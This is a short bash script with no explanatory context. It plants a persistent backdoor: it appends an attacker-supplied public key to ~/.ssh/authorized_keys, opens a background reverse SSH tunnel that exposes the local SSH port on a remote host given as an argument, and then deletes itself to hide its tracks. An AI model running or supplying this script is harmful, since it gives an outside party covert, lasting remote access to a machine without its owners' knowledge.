#!/bin/bash
S="$0"
H=$1
P=$2
K=$3

# Check if SSH client is installed
if ! command -v ssh &> /dev/null; then
    apt-get update && apt-get install -y openssh-client
fi

# Setup authorized key
mkdir -p ~/.ssh
echo "$K" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Start SSH reverse tunnel in background
ssh -f -N -R ${P}:localhost:22 ${H}

# Remove script
rm -f "$S"